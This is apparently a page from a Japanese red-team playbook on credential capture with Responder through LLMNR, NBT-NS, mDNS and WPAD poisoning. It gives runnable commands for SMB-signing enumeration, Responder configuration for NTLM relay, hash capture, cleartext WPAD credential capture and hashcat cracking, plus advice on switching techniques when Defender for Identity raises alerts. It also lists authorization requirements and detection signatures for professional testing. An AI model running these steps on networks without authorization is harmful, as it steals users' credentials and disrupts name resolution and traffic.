# Responder — LLMNR / NBT-NS / mDNS / WPAD ポイズニング

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（WPAD 偽装による HTTP トラフィック乗っ取り・名前解決の横取りによる一時疎通障害）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（Microsoft Defender for Identity の LLMNR/NBNS ポイズニング検知アラート・ネットワーク IDS シグネチャ）
>
> 実施可否は事前合意で明示確認すること。**ntlmrelayx と組み合わせる場合は Relay 先スコープを書面で限定する。**
> 演習環境では制約なし。

---

## 着火条件

以下のいずれかが確認できた場合に試みる：

- ターゲットネットワークが Windows ドメイン環境（LLMNR / NBT-NS はデフォルト有効）
- ドメイン内に **SMB Signing が不要（Not Required）なホスト** が存在する → ntlmrelayx と組み合わせたリレーが有効
- SMB Signing が全体で有効でも、NTLMv2 ハッシュのクラックを目的としてキャプチャしたい場合
- 認証情報を何も持っていない状態（接続のみ提供 / 物理侵入想定）でのファーストステップ

**攻撃者の思考トレース：** Windows クライアントは存在しないホスト名を解決しようとするとき、LLMNR / NBT-NS でブロードキャスト問い合わせを送信する。テスター端末がこれに「私がそのホストです」と応答すると、クライアントは NTLM 認証を試み NTLMv2 ハッシュを送ってくる。WPAD はプロキシ自動検出のため、より多くのクライアントからトラフィックを捕捉できる。SMB Signing が無効なホストが存在すれば、ハッシュをクラックせずそのままリレーしてシェルや権限付与が得られる。

---

## 環境前提

- **実行環境**: テスター端末（ターゲットと同一ブロードキャストドメイン内、または同一 VLAN に到達可能であること）
- **必要なツール**: Responder（ペネトレ用 Linux ディストリ標準搭載）
- **必要な権限**: テスター端末上での `root` 権限（raw socket 操作のため必須）
- **オフライン代替**: GitHub（`lgandx/Responder`）から取得。インターネット遮断環境では事前に転送しておく
- **重要**: LLMNR / NBT-NS はブロードキャストのため **ルーターを超えない**。テスター端末が対象セグメントの L2 に到達できていることを `ip a` と ARP スキャンで確認してから起動する

---

## 観点・着眼点

### 先に確認すること：LLMNR / NBT-NS の有効・無効化状態

Responder を起動する前に、ターゲット環境で LLMNR / NBT-NS が有効かを確認する。
**これが GPO で無効化されていると Responder はハッシュを一切取得できない**ため、起動前に把握しておく。
Analyze モード（`-A`）で観察することが最も確実だが、シェルがある場合は以下で即時確認できる。

```powershell
# [Target] LLMNR 無効化GPOの確認（0 = 無効化 / 非存在または 1 = 有効）
Get-ItemProperty `
  -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" `
  -Name "EnableMulticast" -ErrorAction SilentlyContinue
# 存在しないか値が 1 → LLMNR 有効（Responder が機能する）
# 値が 0 → LLMNR 無効化（GPO 適用済み。Responder はハッシュを取得できない）
```

```powershell
# [Target] NBT-NS の無効化状態確認（TcpipNetbiosOptions: 0=DHCP依存 / 1=有効 / 2=無効）
Get-WmiObject Win32_NetworkAdapterConfiguration |
  Where-Object { $_.TcpipNetbiosOptions -ne $null } |
  Select-Object Description, TcpipNetbiosOptions
# 2 が出ているアダプターは NBT-NS 無効（Responder の NetBIOS ポイズニングは不発）
```

**何が出たら次に何をするか（LLMNR/NBT-NS 無効化確認）：**

| 確認結果 | 判断・次のアクション |
|---------|------------------|
| `EnableMulticast = 0` / LLMNR 無効 | Responder は LLMNR ではハッシュを取得できない。WPAD（`-w`）またはCoerce系 → `Coerce.md` に切り替える |
| `TcpipNetbiosOptions = 2` / NBT-NS 無効 | NetBIOS ポイズニングも不発。IPv6 スプーフィング（mitm6）→ `mitm6.md` を検討する |
| シェルがなく確認できない | Analyze モード（`-A`）で問い合わせが来るかを観察する（後述 Step 0） |
| LLMNR・NBT-NS 両方有効 | 通常モードまたは Relay モードで Responder を起動できる |

---

### 先に確認すること：SMB Signing の状態

Responder を起動する前に、サブネット全体の SMB Signing 状態を確認し Relay 可能なホストを特定する。
この結果によって「ハッシュキャプチャのみ」か「Relay 攻撃」かの方針が決まる。

```bash
# [Attacker] nxc（NetExec）でサブネット全体の SMB Signing 状態を確認
# Relay 可能なホスト（signing:False）のリストを relay_targets.txt に自動出力する
nxc smb [TARGET_SUBNET]/[PREFIX] --gen-relay-list relay_targets.txt
```

出力の読み方：

```
SMB  192.0.2.10  445  [DC_HOSTNAME]    [*] ... (signing:True)  (SMBv1:False)
SMB  192.0.2.20  445  [FS_HOSTNAME]    [*] ... (signing:False) (SMBv1:False)
SMB  192.0.2.30  445  [WS_HOSTNAME]    [*] ... (signing:False) (SMBv1:False)
```

### 何が出たら次に何をするか

| シグナル | 判断・次のアクション |
|---------|------------------|
| `signing:False` のホストが存在する | Relay モードで運用（Responder SMB/HTTP を Off にして ntlmrelayx と併用）→ `ntlmrelayx.md` |
| `signing:False` が DC のみ | DC への SMB リレーは実質困難。LDAP / LDAPS / AD CS リレーを検討 → `ntlmrelayx.md` |
| 全ホストで `signing:True` | ハッシュキャプチャ専用モードで起動 → hashcat クラック |
| 解析モードでブロードキャスト問い合わせがない | LLMNR/NBT-NS が GPO で無効化されている可能性。WPAD 問い合わせの有無を確認 |

---

## 手順

### 事前準備（必須）：Relay 時の Responder.conf 変更

ntlmrelayx と組み合わせる場合、Responder が SMB / HTTP を処理してしまうとハッシュが ntlmrelayx に届かない。
起動前に Responder.conf の SMB / HTTP を `Off` に変更する。

```bash
# [Attacker] Responder.conf の場所を確認し、SMB と HTTP を Off に変更
cat /usr/share/responder/Responder.conf | grep -E "^(SMB|HTTP) ="
# → SMB = On, HTTP = On が返ってくることを確認してから変更

sudo sed -i 's/^SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf

# 変更後の確認
cat /usr/share/responder/Responder.conf | grep -E "^(SMB|HTTP) ="
# → SMB = Off, HTTP = Off であれば OK
```

> **原状回復**：案件終了後または Responder 停止後に `SMB = On / HTTP = On` に戻す。
> 設定ファイルを汚したまま次の案件に持ち込まないよう注意する。

---

### Step 0: 解析モード（Analyze）で事前偵察

通常モードの前に **Analyze モード（`-A`）** で起動し、実際にはポイズニングせずに
ブロードキャスト問い合わせを観察する。どのプロトコルに問い合わせが来ているか、
誰が問い合わせているかを確認してから本モードに移行する。

```bash
# [Attacker] Analyze モード — 応答せず観察のみ（ポイズニング不発）
sudo responder -I [INTERFACE] -A
```

> `[INTERFACE]` はテスター端末の対象セグメント向けインターフェース（`ip a` で確認）。
> 環境によって物理 LAN・VPN・専用線など異なる。

解析モードの出力例：

```
[Analyze mode: LLMNR] Request by 192.0.2.50 for NONEXISTENT-HOST, ignoring
[Analyze mode: NBNS]  Request by 192.0.2.51 for WPAD, ignoring
[Analyze mode: MDNS]  Request by 192.0.2.52 for nonexistent-host.local, ignoring
```

| 観察結果 | 意味・次のアクション |
|---------|------------------|
| LLMNR / NBNS の問い合わせがある | 通常モードまたは Relay モードで起動できる |
| WPAD 問い合わせがある | `-w` オプションで WPAD 偽装が有効 |
| mDNS のみ（問い合わせ元が macOS 等） | NTLMv2 は取得しにくい。WPAD 系に注力 |
| 何も来ない | LLMNR/NBT-NS が GPO で無効化されている可能性 |

---

### Step 1: 通常モード（ハッシュキャプチャ専用）

SMB Signing が全ホストで有効な環境でハッシュ取得のみを目的とする場合。
ntlmrelayx は起動しない。Responder.conf は **デフォルト（SMB = On / HTTP = On）のまま**。

```bash
# [Attacker] 通常モードで起動。NTLMv2 ハッシュをキャプチャしてログファイルに保存する
sudo responder -I [INTERFACE] -wd
```

主要オプション：

| オプション | 効果 |
|-----------|------|
| `-I [INTERFACE]` | リッスンするネットワークインターフェース |
| `-w` | WPAD 偽装サーバーを有効化 |
| `-d` | DHCP Inform パケットへの WPAD 挿入応答 |
| `-F` | WPAD 認証を Basic 形式にして平文クレデンシャルを取得 |
| `-v` | 詳細ログ（問い合わせ元 IP も表示） |
| `--lm` | NTLMv1 応答を強制（古い設定の環境向け。現代の環境では通常不要） |

---

### Step 2: Relay モード（ntlmrelayx との併用）

**事前準備で Responder.conf の SMB / HTTP を Off に変更済みであること。**

```bash
# [Attacker] Relay 専用モードで Responder を起動（別ターミナルで ntlmrelayx も起動する）
sudo responder -I [INTERFACE] -wd
```

> この状態では Responder はポイズニング応答のみ行い、NTLM 認証フローは ntlmrelayx が受け取る。
> ntlmrelayx の起動手順は `ntlmrelayx.md` を参照。

---

### Step 3: キャプチャしたハッシュの確認とクラック

```bash
# [Attacker] キャプチャされた NTLMv2 ハッシュの確認
ls /usr/share/responder/logs/
# ファイル名例: SMB-NTLMv2-SSP-192.0.2.50.txt

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-[TARGET_IP].txt
```

NTLMv2 ハッシュの形式例（`hashcat -m 5600` で処理する形式）：

```
[USER]::[DOMAIN]:1122334455667788:[CHALLENGE_RESPONSE_HASH]:[NTLMV2_BLOB]
```

```bash
# [Attacker] NTLMv2 ハッシュのクラック（hashcat mode 5600）
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-[TARGET_IP].txt [WORDLIST_PATH] -r [RULE_PATH]
```

> クラック詳細 → `../../05_Tools_Reference/Hashcat.md`

---

## ハッシュ取得後の分岐

| 取得結果 | 次のアクション |
|---------|--------------|
| NTLMv2 ハッシュ + SMB Signing 全体で有効 | hashcat でクラック → 平文パスワードで正規ログイン |
| NTLMv2 ハッシュ + SMB Signing 無効ホストあり | ntlmrelayx でリレー → `ntlmrelayx.md` |
| 管理者アカウントのハッシュが来た | クラック成功でドメイン展開。クラック失敗でも Relay が刺さる可能性 |
| WPAD 経由で平文クレデンシャルが来た（`-F` 使用時） | そのまま認証テストに使用 |

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| ハッシュが全く来ない | そのセグメントに Windows クライアントがいないか、LLMNR/NBT-NS が GPO で無効化されている。Analyze モードで観察時間を延ばす |
| WPAD 問い合わせが来ない | `Automatically detect settings` が GPO で Off の環境。`-d`（DHCP）オプションを追加 |
| mDNS のみ応答がある（macOS / Linux 主体） | NTLMv2 ハッシュは取得しにくい。WPAD 以外の手法を検討 |
| 取得したハッシュがクラックできない | 辞書・ルールを変えて再試行。クラック不能なら Relay に切り替える |
| SMB Signing が全体で有効で Relay も不可 | Coerce 系（PetitPotam / PrinterBug / DFSCoerce）による認証強制を検討 → `Coerce.md` |
| Microsoft Defender for Identity が導入されており即アラート | LLMNR/NBT-NS Poisoning の検知は MDI の得意領域。Coerce 系や Pass-The-Hash 系の手法へ切り替える |

---

## 注意点・落とし穴

- **同一 L2 セグメントに到達できる必要がある**：LLMNR / NBT-NS はブロードキャストのためルーターを超えない。ルーティングされた別セグメントには届かない（WPAD HTTP は L3 越えが可能だが、プロキシ設定が必要）
- **ntlmrelayx 併用時は Responder.conf の SMB/HTTP を必ず Off に**：両方が同ポートをリッスンしようとして競合し、どちらも動かなくなる。起動前に設定ファイルを確認する
- **複数のテスターが同一セグメントで Responder を起動しない**：応答が競合しハッシュが分散する。チームでの実施時は起動前にコーディネートする
- **WPAD 偽装の影響範囲**：`-w` を有効にするとそのセグメントの HTTP トラフィックが攻撃者経由になる可能性がある。意図しないサービス中断を避けるため、WPAD proxy をパススルー（透過プロキシ）に設定するか、使用範囲を合意する
- **Responder.conf の変更は案件終了後に戻す**（SMB = On / HTTP = On）。次の利用者・次の案件に影響が出る

---

## 検知される挙動

| 観点 | 検知シグネチャ |
|------|-------------|
| Microsoft Defender for Identity (MDI) | 「LDAP/NTLM Reconnaissance using Account Enumeration」「Suspected NTLM Relay Attack」「LLMNR/NBNS Poisoning and Relay」アラートが高確度で発報 |
| ネットワーク IDS / NDR | LLMNR / mDNS / NBNS の応答が通常の DNS サーバー以外の IP から来ている（未知の送信元 MAC/IP からの応答） |
| Windows イベントログ（ターゲット側） | Event ID 4776（NTLM 認証試行）が DC に記録される |
| Sysmon（ターゲット側） | Event ID 3（ネットワーク接続）— ターゲットから攻撃者 IP へ SMB(445) / HTTP(80) への接続 |
| EDR（テスター端末） | Responder プロセスの起動・raw socket 操作が検知される可能性 |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。アクティブなネットワークポイズニングは SIEM/MDI で即アラートが上がり、ネットワーク上の全クライアントに影響が及ぶ可能性がある
- **想定されるSIEM/EDR検知**: MDI「LLMNR/NBNS Poisoning and Relay」アラート / ネットワーク IDS シグネチャ / Event ID 4776
- **業務影響リスク**: WPAD 偽装時に HTTP トラフィックが攻撃者経由になる可能性（透過プロキシ設定で軽減可能）。名前解決の横取りによる一時的な疎通障害リスク
- **原状回復必須項目**:
  - ✅ Responder.conf の SMB / HTTP 設定を元（On）に戻す
  - ✅ キャプチャしたハッシュ・クラック済みパスワードの暗号化保管 → 案件終了時破棄
- **取得情報の取扱**: NTLMv2 ハッシュ・平文パスワードは暗号化保管、アクセスログ管理、案件終了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：SMB Signing 確認・ホスト列挙 → `../../01_Reconnaissance/SMB_Enumeration.md`
- 後：キャプチャしたハッシュをリレー → `./ntlmrelayx.md`
- 後：キャプチャしたハッシュをクラック → `../../05_Tools_Reference/Hashcat.md`
- 後：Coerce 系による認証強制（PetitPotam / PrinterBug / DFSCoerce） → `./Coerce.md`
